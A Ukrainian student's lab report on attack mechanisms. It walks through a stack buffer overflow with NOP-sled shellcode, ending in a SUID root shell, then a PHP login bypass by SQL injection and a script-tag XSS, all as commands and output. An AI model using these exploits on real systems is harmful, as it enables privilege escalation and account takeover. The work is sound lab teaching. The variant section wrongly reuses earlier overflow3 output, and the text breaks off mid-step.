@@ -1,0 +1,891 @@
+Практичне завдання №4 “Механізми атак”.
+
+* Для виконання наступних завдань потрібна спеціально підготовлена VM. 
+
+1. Переповнення буфера.
+1.1. В ОС Linux створіть файл overflow1.c такого змісту:
+
+[root@localhost root]# vi overflow1.c   
+#include <string.h>
+main (int argc, char *argv[]) {
+ char str1[10];
+ strcpy (str1, argv[1]);
+}
+~
+~
+~
+"overflow1.c" [New] 5L, 95C written
+You have new mail in /var/spool/mail/root
+
+та скомпілюйте виконуваний файл:
+[root@localhost root]# gcc -ggdb -mpreferred-stack-boundary=2 -o overflow1 ./overflow1.c 
+
+
+У даній елементарній програмі наявна вразливість переповнення стека в процедурі strcpy.
+Введіть команду:
+[root@localhost hack]# export LANG=C
+
+
+1.2 Запустіть відладчик зі скомпільованою програмою і встановіть точки зупинки до і після 
+виклику strcpy:
+[root@localhost hack]# gdb -q overflow1
+(gdb) list 1
+1 #include <string.h>
+2 main (int argc, char *argv[]) {
+3 char str1[10];
+4 strcpy (str1, argv[1]);
+5 }
+(gdb) b 4
+Breakpoint 1 at 0x804832e: file overflow1.c, line 4.
+(gdb) b 5
+Breakpoint 2 at 0x8048342: file overflow1.c, line 5.
+(gdb) 
+
+
+Відладчик дозволяє контролювати стан регістрів і пам’яті. Команда виведення вмісту 
+комірок пам’яті має вигляд x/[n]T[size] <адреса пам’яті> , де:
+x – команда;
+n – кількість слів;
+T – формат представлення (x – hex, s – string, i – instruction, d – decimal, c – char, b – byte, w – 
+word, o – octal, u – unsigned decimal, t – binary, f - float);
+[size] – розмір слова (b – byte, h – halfword, w – word, g -giant);
+<адреса пам’яті> може бути задана явно, через показчик або регістр. 
+Виведення значень регістрів: i r <список регістрів>.
+
+
+1.3 Запустіть програму на виконання з вхідним рядком в 10 символів AAAAAAAAAA:
+(gdb) run AAAAAAAAAA
+Starting program: /root/overflow1 AAAAAAAAAA
+
+Breakpoint 1, main (argc=2, argv=0xbfffe154) at overflow1.c:4
+4        strcpy (str1, argv[1]);
+
+
+1.4 Подивіться значення регістрів і стан стека після першої точки зупину:
+(gdb) i r eip ebp esp                                                             
+eip            0x804832e        0x804832e
+ebp            0xbfffe108       0xbfffe108
+esp            0xbfffe0f8       0xbfffe0f8
+
+(gdb) x/32xw $esp
+0xbfffe0f8:     0xbfffe108      0x0804834e      0x42130a14      0x40015360
+0xbfffe108:     0xbfffe128     ●0x42015574●     0x00000002      0xbfffe154
+0xbfffe118:     0xbfffe160      0x4001582c      0x00000002      0x08048278
+0xbfffe128:     0x00000000      0x08048299      0x08048328      0x00000002
+0xbfffe138:     0xbfffe154      0x08048344      0x08048374      0x4000c660
+0xbfffe148:     0xbfffe14c      0x00000000      0x00000002      0xbffffdc6
+0xbfffe158:     0xbffffdd6      0x00000000      0xbffffde1      0xbffffe00
+0xbfffe168:     0xbffffe10      0xbffffe24      0xbffffe32      0xbffffe54
+
+Регістр $esp вказує на вершину стека, а регістр $ebp - на кінець кадру стека поточної 
+процедури. Десь далі перебуватиме адреса повернення з процедури.
+
+
+1.5 Продовжіть виконання програми до другої точки зупину і знову подивіться стан регістрів 
+і стека:
+(gdb) c
+Continuing.
+
+Breakpoint 2, main (argc=2, argv=0xbfffe154) at overflow1.c:5
+5       }
+(gdb) i r eip ebp esp
+eip            0x8048342        0x8048342
+ebp            0xbfffe108       0xbfffe108
+esp            0xbfffe0f8       0xbfffe0f8
+(gdb) x/32xw $esp
+0xbfffe0f8:     0x41414141      0x41414141      0x42004141      0x40015360
+0xbfffe108:     0xbfffe128     ●0x42015574●     0x00000002      0xbfffe154
+0xbfffe118:     0xbfffe160      0x4001582c      0x00000002      0x08048278
+0xbfffe128:     0x00000000      0x08048299      0x08048328      0x00000002
+0xbfffe138:     0xbfffe154      0x08048344      0x08048374      0x4000c660
+0xbfffe148:     0xbfffe14c      0x00000000      0x00000002      0xbffffdc6
+0xbfffe158:     0xbffffdd6      0x00000000      0xbffffde1      0xbffffe00
+0xbfffe168:     0xbffffe10      0xbffffe24      0xbffffe32      0xbffffe54
+(gdb) 
+У стеку з'явилося 10 значень 0x41 (ASCII код символу A), а 11й символ - кінець рядка 0x00. 
+Зверніть увагу, що в кожному слові молодший байт знаходиться за молодшою адресою.
+
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+[root@localhost root]# 
+
+
+1.6 Відкрийте іншу консоль і проекспериментуйте з програмою overflow1, подаючи на вхід 
+різну кількість символів:
+[root@localhost root]# ./overflow1 AAAAAAAAAA
+[root@localhost root]# ./overflow1 AAAAAAAAAAAA
+[root@localhost root]# ./overflow1 AAAAAAAAAAAAAA  
+[root@localhost root]# ./overflow1 AAAAAAAAAAAAAAAAAA
+[root@localhost root]# ./overflow1 AAAAAAAAAAAAAAAAAAA 
+[root@localhost root]# ./overflow1 AAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+[root@localhost root]# ./overflow1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+[root@localhost root]# ./overflow1 AAAAAAAAAAAAAAAAAAA
+[root@localhost root]# 
+
+У якийсь момент переповнюючий рядок досяг адреси повернення з процедури, що 
+зберігається за локальними змінними, і викликав збій сегментації пам'яті (спроба передати 
+управління за адресою, що не використовується будь-якою віртуальною сторінкою пам'яті). А
+якщо спробувати передати управління за адресою, де міститься «корисний» код.
+
+
+1.7 Впровадження шеллкода
+[root@localhost hack]#cd hack
+[root@localhost hack]#export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
+
+У змінну оточення SHELLCODE був записаний шеллкод, а перед ним - 200 символів 
+заповнення 0x90 (NOP, команда, яка робить «ніщо» :).
+Введіть env і знайдіть серед змінних оточення SHELLCODE (або просто echo SHELLCODE).
+Наступна програма:
+#include <stdio.h>
+#include <stdlib.h>
+int main(int argc, char *argv[]) {
+ printf("%s is at %p\n", argv[1], getenv(argv[1]));
+}
+покаже нам адресу пам’яті, по якій розміщується SHELLCODE:
+
+[root@localhost hack]# sudo chmod  +x getenv_example
+[root@localhost hack]# ./getenv_example SHELLCODE   
+SHELLCODE is at 0xbffffcee
+[root@localhost hack]# 
+
+1.8 Експлуатація вразливості:
+[root@localhost hack]# sudo chmod  +x overflow1                           
+[root@localhost hack]# ./overflow1 $(perl -e 'print "\xee\xfc\xff\xbf"x5')
+Segmentation fault
+[root@localhost hack]# ./overflow1 $(perl -e 'print "\xee\xfc\xff\xbf"x6')
+sh-2.05b# 
+
+За допомогою perl вразливій програмі передавався переповнюючий рядок різної довжини. В 
+результаті була запущена нова командна оболонка. Але це ще не все!
+* Зверніть увагу, що байти, які видав getenv_example, вводяться в рядок експлойта в 
+зворотному порядку (спочатку - молодший байт).
+
+
+1.9 Підвищення привілеїв.
+Відкрийте ще одну консоль.
+[root@localhost root]# cd ..
+[root@localhost /]# cd home
+[root@localhost home]# mkdir user1
+[root@localhost home]# cd ..
+[root@localhost /]# cd root
+[root@localhost root]# cd hack
+[root@localhost hack]# cp shellcode.bin overflow1 overflow1.c getenv_example /home/user1
+[user1@localhost user1]$ ls -l   
+total 32
+-rwxr-xr-x    1 root     root        11673 Dec 19 23:14 getenv_example
+-rwxr-xr-x    1 root     root        12098 Dec 19 23:39 overflow1
+-rwsr-xr-x    1 root     root           95 Dec 19 23:14 overflow1.c
+-rw-r--r--    1 root     root           35 Dec 19 23:14 shellcode.bin
+
+Нехай програма з вразливістю має встановлений біт SUID:
+[root@localhost user1]# chmod 4755 overflow1
+
+
+Виконаємо пункти 1.7 и 1.8 від імені непривілейованого користувача:
+[root@localhost user1]# sudo useradd user1
+[root@localhost user1]# su user1
+unknown terminal "xterm-256color"
+unknown terminal "xterm-256color"
+[user1@localhost user1]$ id
+uid=500(user1) gid=500(user1) groups=500(user1)
+[user1@localhost user1]$ export LANG=C
+[user1@localhost user1]$ export SHELLCODE=$(perl -e 'print "\x90"x200' )$(cat shellcode.bin)
+[user1@localhost user1]$ ./getenv_example SHELLCODE
+SHELLCODE is at 0xbffffcdb
+[user1@localhost user1]$ ./overflow1 $(perl -e 'print "\xe5\xfc\xff\xbf"x5') 
+Segmentation fault
+[user1@localhost user1]$ ./overflow1 $(perl -e 'print "\xe5\xfc\xff\xbf"x6')
+sh-2.05b$ id
+uid=0(root) gid=500(user1) groups=500(user1)
+sh-2.05b#  
+↑В результаті, ми проексплуатувати вразливість в програмному коді, впровадили шеллкод і 
+продемонстрували можливість підвищення привілеїв.
+
+
+2. Приклад.
+2.1 Урізноманітнимо програму з попереднього завдання:
+[root@localhost hack]# vi overflow3.c
+#include <string.h>
+void exploitable(char *somestring, int d, char str2[15]) {
+ float ff;
+ char str1[10];
+ int a=1, b=2, c;
+ c=a+b+d;
+ ff=3.14;
+ strcpy (str1, somestring);
+ printf ("Voila: str1=%s bla-bla-bla %d str2=%s ",str1,c,str2);
+}
+main (int argc, char *argv[]) {
+int cc=3;
+char str3[10];
+strcpy (str3,"ABCDEF\n");
+printf("..Some stuff..\n");
+exploitable(argv[1],cc,str3);
+printf("..and more stuff..\n");
+}
+~
+~
+~
+"overflow3.c" [New] 18L, 413C written
+[root@localhost hack]# 
+
+Тут вразлива процедура strcpy присутня в процедурі exploitable. Щоб дослідити
+розташування даних в стеку, в exploitable передається кілька параметрів і оголошується 
+кілька локальних змінних.
+
+
+2.2 Скомпілюємо цю програму і запустимо відладчику:
+[root@localhost hack]# gcc -ggdb -mpreferred-stack-boundary=2 -o overflow3 ./overflow3.c
+[root@localhost hack]# gdb -q overflow3
+(gdb) list
+3        float ff;
+4        char str1[10];
+5        int a=1, b=2, c;
+6        c=a+b+d;
+7        ff=3.14;
+8        strcpy (str1, somestring);
+9        printf ("Voila: str1=%s bla-bla-bla %d str2=%s ",str1,c,str2);
+10      }
+11      main (int argc, char *argv[]) {
+12      int cc=3;
+(gdb) 
+
+Встановимо точки зупину до і після вразливої процедури.
+(gdb) b 8
+Breakpoint 1 at 0x8048383: file overflow3.c, line 8.
+(gdb) b 9
+Breakpoint 2 at 0x8048392: file overflow3.c, line 9.
+
+
+2.3 Запустимо програму з довільною текстовою строкою - аргументом.
+(gdb) run AAAAAAAA
+Starting program: /root/hack/overflow3 AAAAAAAA
+..Some stuff..
+
+Breakpoint 1, exploitable (somestring=0xbffffccb "AAAAAAAA", d=3, 
+    str2=0xbfffe4e4 "ABCDEF\n") at overflow3.c:8
+8        strcpy (str1, somestring);
+
+
+Виконання програми зупинилося перед рядком 9. Показано адреси і значення аргументів 
+процедури exploitable. Перевіримо значення регістрів і стан стека:
+(gdb) i r eip esp ebp
+eip            0x8048383        0x8048383
+esp            0xbfffe4b0       0xbfffe4b0
+ebp            0xbfffe4d0       0xbfffe4d0
+(gdb) x/32xw $esp
+0xbfffe4b0:     0x00000006      0x00000002      0x00000001      0x4204f112
+0xbfffe4c0:     0x4212ee20      0x080484ef      0xbfffe4e4      0x4048f5c3
+0xbfffe4d0:     0xbfffe4f8      0x080483ea      0xbffffccb      0x00000003
+0xbfffe4e0:     0xbfffe4e4      0x44434241      0x000a4645      0x08048406
+0xbfffe4f0:     0x42130a14      0x00000003      0xbfffe518      0x42015574
+0xbfffe500:     0x00000002      0xbfffe544      0xbfffe550      0x4001582c
+0xbfffe510:     0x00000002      0x080482ac      0x00000000      0x080482cd
+0xbfffe520:     0x080483ab      0x00000002      0xbfffe544      0x080483fc
+
+
+Продовжимо виконання програми. Наступна зупинка сталася відразу після вразливої
+процедури strcpy.
+(gdb) c
+Continuing.
+
+Breakpoint 2, exploitable (somestring=0xbffffccb "AAAAAAAA", d=3, 
+    str2=0xbfffe4e4 "ABCDEF\n") at overflow3.c:9
+9        printf ("Voila: str1=%s bla-bla-bla %d str2=%s ",str1,c,str2);
+
+
+Перевіримо стан стека, значення локальних змінних і переданнних функції аргументів.
+(gdb) i r eip esp ebp
+eip            0x8048392        0x8048392
+esp            0xbfffe4b0       0xbfffe4b0
+ebp            0xbfffe4d0       0xbfffe4d0
+(gdb) x/32xw $esp
+0xbfffe4b0:     0x00000006      0x00000002      0x00000001      0x41414141
+0xbfffe4c0:     0x41414141      0x08048400      0xbfffe4e4      0x4048f5c3
+0xbfffe4d0:     0xbfffe4f8      0x080483ea      0xbffffccb      0x00000003
+0xbfffe4e0:     0xbfffe4e4      0x44434241      0x000a4645      0x08048406
+0xbfffe4f0:     0x42130a14      0x00000003      0xbfffe518      0x42015574
+0xbfffe500:     0x00000002      0xbfffe544      0xbfffe550      0x4001582c
+0xbfffe510:     0x00000002      0x080482ac      0x00000000      0x080482cd
+0xbfffe520:     0x080483ab      0x00000002      0xbfffe544      0x080483fc
+(gdb) x/dw &a
+0xbfffe4b8:     1
+(gdb) x/dw &b
+0xbfffe4b4:     2
+(gdb) x/dw &c
+0xbfffe4b0:     6
+(gdb) x/dw &d
+0xbfffe4dc:     3
+(gdb) x/fw &ff
+0xbfffe4cc:     3.1400001
+(gdb) x/xw &ff  
+0xbfffe4cc:     0x4048f5c3
+(gdb) x/s somestring
+0xbffffccb:      "AAAAAAAA"
+(gdb) x/4xw somestring
+0xbffffccb:     0x41414141      0x41414141      0x534f4800      0x4d414e54
+(gdb) x/s str2
+0xbfffe4e4:      "ABCDEF\n"
+(gdb) x/4xw str2
+0xbfffe4e4:     0x44434241      0x000a4645      0x08048406      0x42130a14
+(gdb) x/s str1
+0xbfffe4bc:      "AAAAAAAA"
+(gdb) x/4xw str1
+0xbfffe4bc:     0x41414141      0x41414141      0x08048400      0xbfffe4e4
+(gdb) 
+
+Тепер можемо відновити розташування даних в стеку:
+0xbfffe4b0:       <c>           <b>             <a>            <str1>
+0xbfffe4c0:      <str1>        <str1>         <&str2>           <ff>
+0xbfffe4d0:      <SFP>      ●0x080483ea●    <&somestring>       <d>
+0xbfffe4e0:     <&str2>        <str2>          <str2>          <str2>
+0xbfffe4f0:      <str2>      0x00000003      0xbfffe518      0x42015574
+*<SFP> - Saved Frame Pointer – збережене значення EBP попереднього кадру стека.
+
+Щоб дізнатися адресу повернення з процедури exploitable, дізассемблюємо частину програми.
+(gdb) disass main
+Dump of assembler code for function main:
+0x080483ab <main+0>:    push   %ebp
+0x080483ac <main+1>:    mov    %esp,%ebp
+0x080483ae <main+3>:    sub    $0x14,%esp
+0x080483b1 <main+6>:    movl   $0x3,0xfffffffc(%ebp)
+0x080483b8 <main+13>:   push   $0x80484e7
+0x080483bd <main+18>:   lea    0xffffffec(%ebp),%eax
+0x080483c0 <main+21>:   push   %eax
+0x080483c1 <main+22>:   call   0x804829c <strcpy>
+0x080483c6 <main+27>:   add    $0x8,%esp
+0x080483c9 <main+30>:   push   $0x80484ef
+0x080483ce <main+35>:   call   0x804828c <printf>
+0x080483d3 <main+40>:   add    $0x4,%esp
+0x080483d6 <main+43>:   lea    0xffffffec(%ebp),%eax
+0x080483d9 <main+46>:   push   %eax
+0x080483da <main+47>:   pushl  0xfffffffc(%ebp)
+0x080483dd <main+50>:   mov    0xc(%ebp),%eax
+0x080483e0 <main+53>:   add    $0x4,%eax
+0x080483e3 <main+56>:   pushl  (%eax)
+●0x080483e5 <main+58>:   call   0x804835c <exploitable>
+●0x080483ea <main+63>:   add    $0xc,%esp
+0x080483ed <main+66>:   push   $0x80484ff
+0x080483f2 <main+71>:   call   0x804828c <printf>
+0x080483f7 <main+76>:   add    $0x4,%esp
+0x080483fa <main+79>:   leave  
+0x080483fb <main+80>:   ret    
+End of assembler dump.
+(gdb) 
+
+Адресою повернення із exploitable буде адреса наступної строки після виклика
+call 0x804835c <exploitable> тобто 0x080483ea. Ця адреса збігається зі значенням в стеці за 
+адресою 0xbfffe4d4.
+
+Таким чином, адреса повернення займає сьоме чотирьохбайтне слово відносно початку рядка str1.
+
+
+2.4 Тепер повторимо з даною програмою дії, аналогічні п. 1.6-1.9.
+[root@localhost hack]# cp overflow3 /home/user1
+[root@localhost hack]# cp shellcode.bin /home/user1
+cp: overwrite `/home/user1/shellcode.bin'? yes
+[root@localhost hack]# cp getenv_example /home/user1                       
+cp: overwrite `/home/user1/getenv_example'? yes
+[root@localhost hack]# cd /home/user1
+[root@localhost user1]# chmod 4755 overflow3
+[root@localhost user1]# chmod o+x getenv_example
+[root@localhost user1]# su user1
+unknown terminal "xterm-256color"
+unknown terminal "xterm-256color"
+[user1@localhost user1]$ id
+uid=500(user1) gid=500(user1) groups=500(user1)
+[user1@localhost user1]$ env | grep LANG
+LANG=en_US.UTF-8
+[user1@localhost user1]$ export LANG=C
+[user1@localhost user1]$ env | grep LANG
+LANG=C
+[user1@localhost user1]$ env | grep SHELLCODE
+SHELLCODE=��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��j
+                                                                                                                                                                                                                           XQh//shh/bin��Q��S��
+[user1@localhost user1]$ export SHELLCODE=$(perl -e 'print "\x90"x200' )$(cat shellcode.bin)
+[user1@localhost user1]$ env | grep SHELLCODE
+SHELLCODE=��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��j
+                                                                                                                                                                                                                           XQh//shh/bin��Q��S��
+[user1@localhost user1]$ ./getenv_example SHELLCODE
+SHELLCODE is at 0xbffffcf1
+*Отримана від getenv_example адреса підставляється в строку експлойта в зворотному
+порядку байт.
+
+[user1@localhost user1]$ ./overflow3 $(perl -e 'print "\xf1\xfc\xff\xbf"x5')
+..Some stuff..
+Voila: str1=�������������������� bla-bla-bla 6 str2=ABCDEF
+ ..and more stuff..
+Segmentation fault
+[user1@localhost user1]$ ./overflow3 $(perl -e 'print "\xf1\xfc\xff\xbf"x6')
+..Some stuff..
+Voila: str1=������������������������ bla-bla-bla 6 str2=ABCDEF
+Segmentation fault
+[user1@localhost user1]$ ./overflow3 $(perl -e 'print "\xf1\xfc\xff\xbf"x7')
+..Some stuff..
+Voila: str1=���������������������������� bla-bla-bla 6 str2=ABCDEF
+sh-2.05b# id
+uid=0(root) gid=500(user1) groups=500(user1)
+sh-2.05b# 
+
+
+3. SQL-ін'єкція.
+3.1. Увійдіть в систему під обліковим записом суперкористувача.
+[user1@localhost root]$ su root
+Password: 
+unknown terminal "xterm-256color"
+unknown terminal "xterm-256color"
+[root@localhost root]# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
+
+3.2. Встановіть ip-адреса із внутрішньої (Host-only) підмережі вашого комп'ютера (в завданні 
+     - 192.168.74.10). 
+[root@localhost root]# vi /etc/sysconfig/network-scripts/ifcfg-eth0
+DEVICE=eth0
+BOOTPROTO=static
+BROADCAST=192.168.74.255
+IPADDR=192.168.74.10
+NETMASK=255.255.255.0
+NETWORK=192.168.74.0
+ONBOOT=yes
+~
+~
+~
+"/etc/sysconfig/network-scripts/ifcfg-eth0" 7L, 129C written
+[root@localhost root]# ifup eth0
+[root@localhost root]# service network restart
+Shutting down interface eth0:                        [  OK  ]
+Shutting down loopback interface:                    [  OK  ]
+Setting network parameters:                          [  OK  ]
+Bringing up loopback interface:                      [  OK  ]
+Bringing up interface eth0:                          [  OK  ]
+[root@localhost root]# ifconfig eth0
+eth0      Link encap:Ethernet  HWaddr 00:0C:29:DD:82:21  
+          inet addr:192.168.74.10  Bcast:192.168.74.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:581 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:266 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:100 
+          RX bytes:63834 (62.3 Kb)  TX bytes:37150 (36.2 Kb)
+          Interrupt:10 Base address:0x10a4 
+
+[root@localhost root]# 
+
+-Утилітою ping перевірте досяжність між VM і фізичним комп'ютером:
+  VM Red Hat 90_483:
+[root@localhost root]# ping -c4 192.168.74.44
+PING 192.168.74.44 (192.168.74.44) 56(84) bytes of data.
+64 bytes from 192.168.74.44: icmp_seq=1 ttl=64 time=0.548 ms
+64 bytes from 192.168.74.44: icmp_seq=2 ttl=64 time=0.837 ms
+64 bytes from 192.168.74.44: icmp_seq=3 ttl=64 time=0.626 ms
+64 bytes from 192.168.74.44: icmp_seq=4 ttl=64 time=1.10 ms
+
+--- 192.168.74.44 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3006ms
+rtt min/avg/max/mdev = 0.548/0.778/1.103/0.216 ms
+
+  VM Client:
+┌──(nazar㉿Client)-[~]
+└─$ ping -c4 192.168.74.44                                                          
+PING 192.168.74.44 (192.168.74.44) 56(84) bytes of data.
+64 bytes from 192.168.74.44: icmp_seq=1 ttl=64 time=0.047 ms
+64 bytes from 192.168.74.44: icmp_seq=2 ttl=64 time=0.048 ms
+64 bytes from 192.168.74.44: icmp_seq=3 ttl=64 time=0.063 ms
+64 bytes from 192.168.74.44: icmp_seq=4 ttl=64 time=0.063 ms
+
+--- 192.168.74.44 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3062ms
+rtt min/avg/max/mdev = 0.047/0.055/0.063/0.007 ms
+
+
+3.3. Перевірте, чи запущені сервіси web і MySQL і якщо ні, то запустіть.
+[root@localhost root]# ps -A | grep httpd
+[root@localhost root]# service httpd start
+Starting httpd:                                     [  OK  ]
+[root@localhost root]# ps -A | grep httpd 
+ 2901 ?        00:00:00 httpd
+ 2904 ?        00:00:00 httpd
+ 2905 ?        00:00:00 httpd
+ 2906 ?        00:00:00 httpd
+ 2907 ?        00:00:00 httpd
+ 2908 ?        00:00:00 httpd
+ 2909 ?        00:00:00 httpd
+ 2910 ?        00:00:00 httpd
+ 2911 ?        00:00:00 httpd
+[root@localhost root]# service mysqld start
+Starting MySQL:                                     [  OK  ]
+[root@localhost root]# ps -A | grep mysqld
+ 2925 pts/1    00:00:00 safe_mysqld
+ 2950 pts/1    00:00:00 mysqld
+[root@localhost root]# 
+
+
+3.4 З web-браузера хоста зверніться за адресою віртуального сервера: 
+    http://192.168.74.10/testform/example.php
+    Ви побачите результат відображення даної динамічної сторінки:
+<?php
+include("_tophead_personal.php");
+mysql_connect('localhost','root','');
+echo "user: ".$username."<br>";
+$qry="select * from users where username='$username' and passwd='$passwd' ";
+echo $qry."<br>";
+$result=mysql_db_query('test',$qry);
+if (mysql_num_rows($result)) echo "<br>Authenticatiion success!!<br>";
+?>
+<form action='example.php' method='post' name='form1'>
+usrername:<input type=text name=username size=15>
+<br>
+password :<input type=text name=passwd size=15>
+<input type=submit>
+</form>
+<?
+echo "<br>";
+include("_bottom_personal.php");
+?>
+
+    ↓Відображення web-сторінки↓
+					Test page...
+--------------------------------------------------------------------------------------------
+user:
+select * from users where username='' and passwd=''
+usrername:
+password :                     *Submit Query*
+--------------------------------------------------------------------------------------------
+2021122112052916400811294f6474700eaa859d48beda963fffd47d
+-	-	-	-	-	-	-	-	-	-	-	-
+wwd© 2021 
+
+
+Тут пропонується ввести username і password, після відправки форми виводиться отримане 
+username і рядок запиту, виконується SQL-запит, в який підставляються отримані параметри. 
+Якщо в БД знайдена хоча-б одна така пара username / password - "автентифікація" вважається 
+успішною.
+* Спосіб аутентифікації абсолютно не коректний і використаний тільки для спрощення прикладу.
+
+
+3.5 Припустимо, є обліковий запис admin з невідомим паролем.
+Підставте в поле username: admin
+	а в поле password: 111 ' or 1=1 --' 
+та виконайте запит.
+
+    ↓В результаті має появитися такий текст:↓
+					Test page...
+--------------------------------------------------------------------------------------------
+user: admin
+select * from users where username='admin' and passwd='111 ' or 1=1 --'' 
+
+Authenticatiion success!!
+usrername:
+password :                     *Submit Query*
+--------------------------------------------------------------------------------------------
+2021122112132116400816010ab434ad50531d6affdbaed1cc0c69ba
+-	-	-	-	-	-	-	-	-	-	-	-
+wwd© 2021 
+
+
+У рядок запиту підставили існуюче в БД «username», довільне значення «passwd» і 
+конструкцію ' or 1=1 --', яка змінила логіку запиту і хід програми.
+* Символи коментаря в MySQL «--» закінчують рядок запиту, а друга лапка потрібна для 
+дотримання парності символів.
+
+
+4. Cross-Site Scripting (XSS, міжсайтовий скриптинг).
+4.1. Знову поверніться на сторінку:
+     http://192.168.74.10/testform/example.php
+Підставте в поле username: admin <script>alert('Hi!');</script>
+	а в поле password: 111
+та виконайте запит.
+
+1)Отримали наступний результат↓
+					Test page...
+--------------------------------------------------------------------------------------------
+user: admin
+
+2)У вікні браузера має з’явитися повідомлення:
+               -----------------------
+              |                       |
+	      |	         Hi!          |
+	      |                       |
+              |                       |
+	      |			*OK*  |
+	       -----------------------
+
+3)Натиснувши клавішу OK, ми побачимо насупне відображення web-торінки↓
+					Test page...
+--------------------------------------------------------------------------------------------
+user: admin
+select * from users where username='admin ' and passwd='111' 
+
+Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/html/testform/example.php on line 13
+usrername:
+password :                     *Submit Query*
+--------------------------------------------------------------------------------------------
+202112211220351640082035336f1bd4c52b1b5ff3ed409dbf04a2da
+-	-	-	-	-	-	-	-	-	-	-	-
+wwd© 2021
+
+4)Ми скористалися програмою з попереднього завдання, яка виводила username, і в виведенні 
+на стороні клієнта з'явився код, який був інтерпретований браузером як Java Script.
+
+--------------------------------------------------------------------------------------------
+
+    ↓Завдання відповідно до свого варіанту↓
+У даній програмі замініть зазначені рядки відповідно до індивідуального варіанту і дослідіть
+отриману програму аналогічно п.п. 2.1-2.4.
+#include <string.h>
+(3) void exploitable(char *somestring, int d, char str2[15]) {
+(4) float ff;
+(5) char str1[10];
+(6) int a=1, b=2, c;
+(7) c=a+b+d;
+(8) ff=3.14;
+(9) strcpy (str1, somestring);
+(10) printf ("Voila: str1=%s bla-bla-bla %d str2=%s ",str1,c,str2);
+}
+main (int argc, char *argv[]) {
+(14) int cc=3;
+(15) char str3[10];
+(16) strcpy (str3,"ABCDEF\n");
+(17) printf("..Some stuff..\n");
+(18) exploitable(argv[1],cc,str3);
+(19) printf("..and more stuff..\n");
+}
+
+
+●Варіант 1.14 (ФБ-01 Сахній Назар)
+(3) void exploitable(char str2[15], char *somestring, int d) {
+(4) char str1[8];
+(5) float ff;
+(6) int a=1, b=2, c;
+(7) c=a+b+d;
+(8) ff=1.14;
+...
+(18) exploitable(str3,argv[1],cc);
+…
+
+
+2. Варіант 1.14 (ФБ-01 Сахній Назар)
+2.1 Урізноманітнимо програму відповідно до варіанту:
+[root@localhost hack]# vi overflow_1_14.c
+#include <string.h>
+void exploitable(char str2[15], char *somestring, int d) {
+ char str1[8];
+ float ff;
+ int a=1, b=2, c;
+ c=a+b+d;
+ ff=1.14;
+ strcpy (str1, somestring);
+ printf ("Voila: str1=%s bla-bla-bla %d str2=%s ",str1,c,str2);
+}
+main (int argc, char *argv[]) {
+int cc=3;
+char str3[10];
+strcpy (str3,"ABCDEF\n");
+printf("..Some stuff..\n");
+exploitable(str3,argv[1],cc);
+printf("..and more stuff..\n");
+}
+~
+~
+~
+"overflow_1_14.c" [New] 18L, 412C written
+[root@localhost hack]# 
+
+Тут вразлива процедура strcpy присутня в процедурі exploitable. Щоб дослідити
+розташування даних в стеку, в exploitable передається кілька параметрів і оголошується 
+кілька локальних змінних.
+
+
+2.2 Скомпілюємо цю програму і запустимо відладчику:
+[root@localhost hack]# gcc -ggdb -mpreferred-stack-boundary=2 -o overflow_1_14 ./overflow_1_14.c
+[root@localhost hack]# gdb -q overflow_1_14
+(gdb) list
+3        char str1[8];
+4        float ff;
+5        int a=1, b=2, c;
+6        c=a+b+d;
+7        ff=1.14;
+8        strcpy (str1, somestring);
+9        printf ("Voila: str1=%s bla-bla-bla %d str2=%s ",str1,c,str2);
+10      }
+11      main (int argc, char *argv[]) {
+12      int cc=3;
+(gdb)  
+
+Встановимо точки зупину до і після вразливої процедури.
+(gdb) b 8
+Breakpoint 1 at 0x8048383: file overflow_1_14.c, line 8.
+(gdb) b 9
+Breakpoint 2 at 0x8048392: file overflow_1_14.c, line 9.
+
+
+2.3 Запустимо програму з довільною текстовою строкою - аргументом.
+(gdb) run AAAAAAAA
+Starting program: /root/hack/overflow_1_14 AAAAAAAA
+..Some stuff..
+
+Breakpoint 1, exploitable (str2=0xbfffeed4 "ABCDEF\n", 
+    somestring=0xbffffcc7 "AAAAAAAA", d=3) at overflow_1_14.c:8
+8        strcpy (str1, somestring);
+
+
+Виконання програми зупинилося перед рядком 9. Показано адреси і значення аргументів 
+процедури exploitable. Перевіримо значення регістрів і стан стека:
+(gdb) i r eip esp ebp
+eip            0x8048383        0x8048383
+esp            0xbfffeea8       0xbfffeea8
+ebp            0xbfffeec0       0xbfffeec0
+(gdb) x/32xw $esp
+0xbfffeea8:     0x00000006      0x00000002      0x00000001      0x3f91eb85
+0xbfffeeb8:     0xbfffeed4      0xb7fb69ec      0xbfffeee8      0x080483ea
+0xbfffeec8:     0xbfffeed4      0xbffffcc7      0x00000003      0x44434241
+0xbfffeed8:     0x000a4645      0x08048406      0x42130a14      0x00000003
+0xbfffeee8:     0xbfffef08      0x42015574      0x00000002      0xbfffef34
+0xbfffeef8:     0xbfffef40      0x4001582c      0x00000002      0x080482ac
+0xbfffef08:     0x00000000      0x080482cd      0x080483ab      0x00000002
+0xbfffef18:     0xbfffef34      0x080483fc      0x0804842c      0x4000c660
+
+
+Продовжимо виконання програми. Наступна зупинка сталася відразу після вразливої
+процедури strcpy.
+(gdb) c
+Continuing.
+
+Breakpoint 2, exploitable (somestring=0xbffffccb "AAAAAAAA", d=3, 
+    str2=0xbfffe4e4 "ABCDEF\n") at overflow3.c:9
+9        printf ("Voila: str1=%s bla-bla-bla %d str2=%s ",str1,c,str2);
+
+
+Перевіримо стан стека, значення локальних змінних і переданнних функції аргументів.
+(gdb) i r eip esp ebp
+eip            0x8048392        0x8048392
+esp            0xbfffe4b0       0xbfffe4b0
+ebp            0xbfffe4d0       0xbfffe4d0
+(gdb) x/32xw $esp
